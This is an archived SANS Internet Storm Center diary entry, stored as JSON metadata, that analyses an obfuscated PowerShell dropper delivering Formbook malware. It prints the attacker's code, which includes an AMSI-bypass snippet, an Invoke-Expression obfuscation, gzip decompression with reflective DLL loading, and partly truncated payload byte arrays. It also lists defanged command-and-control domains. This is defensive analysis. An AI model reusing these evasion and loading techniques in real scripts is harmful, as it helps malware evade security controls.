{
    "id": "5deca038-b50a-4545-8a99-cf77a17dc28f",
    "created_at": "2023-01-12T15:08:31.308729Z",
    "updated_at": "2025-03-27T02:05:46.421318Z",
    "deleted_at": null,
    "sha1_hash": "f7277530bfd63986f117e396452fbc9c74af8d53",
    "title": "2020-11-19 - PowerShell Dropper Delivering Formbook",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:36Z",
    "file_modification_date": "2022-05-28T15:57:36Z",
    "file_size": 1592801,
    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/26806**\n\n## PowerShell Dropper Delivering Formbook\n\n**Published: 2020-11-19**\n\n**Last Updated: 2020-11-19 05:47:34 UTC**\n\n**by** [Xavier Mertens (Version: 1)](https://isc.sans.edu/handler_list.html#xavier-mertens)\n\n[0 comment(s)](https://isc.sans.edu/forums/diary/PowerShell+Dropper+Delivering+Formbook/26806/#comments)\nHere is an interesting PowerShell dropper that is nicely obfuscated and has anti-VM detection. I\nspotted this file yesterday, called\n'ad.jpg' (SHA256:b243e807ed22359a3940ab16539ba59910714f051034a8a155cc2aff28a85088).\nOf course, it's not a picture but a huge text file with Base64-encoded data. The VT score is\n[therefore interesting: 0/61![1]. Once decoded, we discover the obfuscated PowerShell code.](https://www.virustotal.com/gui/file/b243e807ed22359a3940ab16539ba59910714f051034a8a155cc2aff28a85088/detection)\nLet's review the techniques implemented by the attacker.\n\nFirst, we see this at the very beginning of the script:\n```\n[Ref].Assembly.GetType('System.Management.Automation.'+$([CHAr]([Byte]0x41)+[ChAr]\n([bYTe]0x6D)+[Char](82+33)+\\\n[ChAr]\n([BYTe]0x69))+'Utils').GetField($([SyStEM.Net.WEBUTilItY]::htMLdeCode('&#97;&#109;&#115;&\n \\\n&#110;&#105;&#116;&#70;&#97;&#105;&#108;&#101;&#100;')),'NonPublic,Static').SetValue($nul\n\n```\nWhich is deobfuscated into:\n```\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils.amsiInitFailed)),'NonPubli\n\n```\n[This piece of code comes from the PoSHBypass[2] project. It's a proof of concept that allows](https://github.com/davehardy20/PoSHBypass)\nan attacker to bypass PowerShell's Constrained Language Mode, AMSI and ScriptBlock, and\nModule logging.\n\nThen, classic behaviour, we have an obfuscation of the Invoke-Expression cmdlet:\n```\n$ZER0HRFGEPXLGAJHCZYNIFQKWXNPYMID='MEX'.replace('M','I');\nsal g $ZER0HRFGEPXLGAJHCZYNIFQKWXNPYMID;\n\n```\n\n-----\n\nThis code will make g an alias of Invoke-Expression. This is used immediately to decode and\nexecute the following chunk of data:\n```\n[Byte[]]$IMAGE_NT_HEADERS=\n('@1F,@8B,@08,@00,@00,@00,@00,@00,@04,@00,@ED,@BD,@07,@60,@1C,@49,@96,@25,@26,@2F,@6D,@CA\n@F5,@4A,@D7,@E0,@74,@A1,@08,@80,@60,@13,@24,@D8,@90,@40,@10,@EC,@C1,@88,@CD,@E6,@92,@EC,@\n@23,@29,@AB,@2A,@81,@CA,@65,@56,@65,@5D,@66,@16,@40,@CC,@ED,@9D,@BC,@F7,@DE,@7B,@EF,@BD,@\n@EF,@BD,@F7,@BA,@3B,@9D,@4E,@27,@F7,@DF,@FF,@3F,@5C,@66,@64,@01,@6C,@F6,@CE,@4A,@DA,@C9,@\n...\n@34,@6F,@8F,@7E,@8D,@1F,@23,@18,@C7,@CC,@FF,@18,@F3,@84,@A0,@83,@EB,@FB,@70,@EE,@D3,@BB,@\n@C7,@D2,@E4,@47,@CF,@FF,@B7,@9E,@5F,@E3,@E5,@AF,@43,@5C,@4C,@72,@77,@FF,@FF,@63,@78,@FF,@\n@9E,@FF,@07,@78,@61,@2A,@8D,@00,@42,@04,@00,@00'.replace('@','0x'))| g;\n\n```\nThe result string is passed to the following function:\n```\nfunction JAPFYAQPECMKYQNLCJXCOFSVYMER {\n [CmdletBinding()]\n Param ([bYte[]] $VDLXLPBUCEUOIHNKREBMWCWEFMERbyteARRay)\n Process {\n  $WRSWRLDCDXEUUYFBJUWQZJSDGMERiNput = New-Object System.IO.MemoryStream(,\n$VDLXLPBUCEUOIHNKREBMWCWEFMERbyteARRay )\n  $MZCUMHEBORHYCNKFFBEUSZDTZMERouTPut = New-Object System.IO.MemoryStream\n  $PHQDSFCPEMOPKRYRNBGRTBCCIMERPAGE_EXECUTE_READWRITE = New-Object\nSystem.IO.Compression.GzipStream $WRSWRLDCDXEUUYFBJUWQZJSDGMERiNput,\n([IO.Compression.CompressionMode]::Decompress)\n  $EONFFJPUIRZMNCRBQZKESIVGGMIDCONTEXT_FULL = New-Object bYtE[](1024)\n  while($tRUe){\n   $BBYRATZNTGIAUBPDRVBIQAMRDMERREread =\n$PHQDSFCPEMOPKRYRNBGRTBCCIMERPAGE_EXECUTE_READWRITE.Read($EONFFJPUIRZMNCRBQZKESIVGGMIDCON\n 0, 1024)\n   if ($BBYRATZNTGIAUBPDRVBIQAMRDMERREread -lE 0){bReAk}\n$MZCUMHEBORHYCNKFFBEUSZDTZMERouTPut.Write($EONFFJPUIRZMNCRBQZKESIVGGMIDCONTEXT_FULL, 0,\n$BBYRATZNTGIAUBPDRVBIQAMRDMERREread)\n  }\n  [bYte[]] $QTXDBVKLTJMGOACBLEIVSJSQHMIDouT =\n$MZCUMHEBORHYCNKFFBEUSZDTZMERouTPut.ToArray()\n }\n}\n\n```\nIt will uncompress the buffer and generate a DLL\n(SHA256:A7D74BE8AF1645FBECFC2FE915E0B77B287CE09AD3A7E220D20794475B0401F9)\nwhich is not present on VT at this time. This DLL is injected in the PowerShell process:\n```\n[bYte[]]$decompressedByteArray = JAPFYAQPECMKYQNLCJXCOFSVYMER $IMAGE_NT_HEADERS\n$t=[System.Reflection.Assembly]::Load($decompressedByteArray)\n\n```\nThen, another chunk of data is decoded:\n\n\n-----\n\n```\n[Byte[]]$HNAUVVBGYKNXXMOTZHSTOHTKRMID\n('@4D,@5A,@45,@52,@E8,@00,@00,@00,@00,@58,@83,@E8,@09,@8B,@C8,@83,@C0,@3C,@8B,@00,@03,@C1\n@FF,@E1,@90,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@\n@00,@00,@00,@00,@00,@00,@C0,@00,@00,@00,@0E,@1F,@BA,@0E,@00,@B4,@09,@CD,@21,@B8,@01,@4C,@\n@73,@20,@70,@72,@6F,@67,@72,@61,@6D,@20,@63,@61,@6E,@6E,@6F,@74,@20,@62,@65,@20,@72,@75,@\n...\n0,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00,@00\n g\n\n```\nThis is the main payload dropped by the Powershell\n(SHA256:A07AE0F8E715E243C514B8DA6FD83C5955E1C8EDE5EEBF4D6494EE97443AAD95).\nSame here, it's not available on VT yet.\n\nThe payload is executed via the following code:\n```\n[QuotingUtilities]::SplitUnquoted('control.exe',$HNAUVVBGYKNXXMOTZHSTOHTKRMID)\n\n```\nThis function is provided by the injected DLL:\n\nThis function implements an interesting anti-VM check that, if running in a virtualized\nenvironment, stop the Powershell and prevent the payload to be executed:\n\n\n-----\n\nNote that I don't know why a popup message is displayed. The goal of malware is to operate\nbelow the radar... (maybe the code is still being debugged by the attacker?)\n\nHere is how the VMware environment is detected:\n\n(Maybe there are other tests performed but I did not investigate further)\n\nThe DLL is also obfuscated with a tool that I never met before:\n\n\n-----\n\nIf you have more information about this \"Zephyrus Protector\" tool, please share with me!\n\nThe Formbook sample tries to contact the following hosts:\n\nwww[.]zenhalklailiskiler[.]online\n\nwww[.]insights-for-instagram[.]com\n\nwww[.]ketaminetherapycalgary.com\n\nwww[.]forwardslashdevelopment[.]com\n\nwww[.]arikmertelsanatlari[.]xyz\n\nwww[.]bklynphotography[.]com\n\nwww[.]experiencewinneroftheyear[.]com\n\nwww[.]kansas-chiefs[.]com\n\nwww[.]vrefirsttime[.]com\n\nwww[.]issahclothing[.]com\n\nwww[.]denver-nuggets[.]club\n\nwww[.]wwwhookeze[.]com\n\nwww[.]moxieadvice[.]com\n\nwww[.]gangtayvietnam[.]com\n\nwww[.]cosmosguards[.]com\n\nwww[.]magentx2[.]info\n\n\n-----\n\n[1] https://www.virustotal.com/gui/file/b243e807ed22359a3940ab16539ba59910714f051034a8a\n155cc2aff28a85088/detection\n\n[2] [https://github.com/davehardy20/PoSHBypass](https://github.com/davehardy20/PoSHBypass)\n\nXavier Mertens (@xme)\nSenior ISC Handler - Freelance Cyber Security Consultant\n[PGP Key](https://keybase.io/xme/key.asc)\n\n[Keywords: AntiVM](https://isc.sans.edu/tag.html?tag=AntiVM) [Dropper](https://isc.sans.edu/tag.html?tag=Dropper) [Formbook](https://isc.sans.edu/tag.html?tag=Formbook) [Injection](https://isc.sans.edu/tag.html?tag=Injection) [Obfuscation](https://isc.sans.edu/tag.html?tag=Obfuscation) [PowerShell](https://isc.sans.edu/tag.html?tag=PowerShell) [Trojan](https://isc.sans.edu/tag.html?tag=Trojan)\n[0 comment(s)](https://isc.sans.edu/forums/diary/PowerShell+Dropper+Delivering+Formbook/26806/)\n\nJoin us at SANS! Attend Reverse-Engineering Malware: Malware Analysis Tools and Techniques\nwith Xavier Mertens in Amsterdam starting Aug 15 2022\n\nTop of page\n√ó\n\n[Diary Archives](https://isc.sans.edu/diaryarchive.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-19 - PowerShell Dropper Delivering Formbook.pdf"
    ],
    "report_names": [
        "2020-11-19 - PowerShell Dropper Delivering Formbook.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536111,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653753456,
    "ts_modification_date": 1653753456,
    "files": {
        "pdf": "https://archive.orkl.eu/f7277530bfd63986f117e396452fbc9c74af8d53.pdf",
        "text": "https://archive.orkl.eu/f7277530bfd63986f117e396452fbc9c74af8d53.txt",
        "img": "https://archive.orkl.eu/f7277530bfd63986f117e396452fbc9c74af8d53.jpg"
    }
}